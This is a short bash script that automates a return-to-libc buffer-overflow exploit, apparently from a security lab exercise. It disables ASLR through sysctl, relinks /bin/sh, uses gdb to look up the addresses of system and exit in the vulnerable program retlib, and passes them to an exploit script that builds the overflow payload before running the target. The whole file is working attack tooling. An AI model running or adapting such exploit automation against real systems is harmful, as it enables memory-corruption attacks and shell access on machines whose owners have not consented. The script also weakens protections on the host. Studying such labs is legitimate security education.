
#!/bin/bash
set -e
 
sudo sysctl -w kernel.randomize_va_space=0
sudo ln -sf /bin/zsh /bin/sh
export MYSHELL=/bin/sh
 
SH_ADDR=$(./prtenv) || true
 
touch badfile
printf "break main\nrun\np system\np exit\nquit\n" > gdb_command.txt
GDB_OUT=$(gdb -q -batch -x gdb_command.txt ./retlib)
SYS_ADDR=$(echo "$GDB_OUT" | grep '<system>' | grep -oP '0x[0-9a-f]+')
EXIT_ADDR=$(echo "$GDB_OUT" | grep '<exit>' | grep -oP '0x[0-9a-f]+')
 
echo "sh_addr=0x$SH_ADDR  system_addr=$SYS_ADDR  exit_addr=$EXIT_ADDR"
 
python3 exploit_script.py "0x$SH_ADDR" "$SYS_ADDR" "$EXIT_ADDR"
./retlib
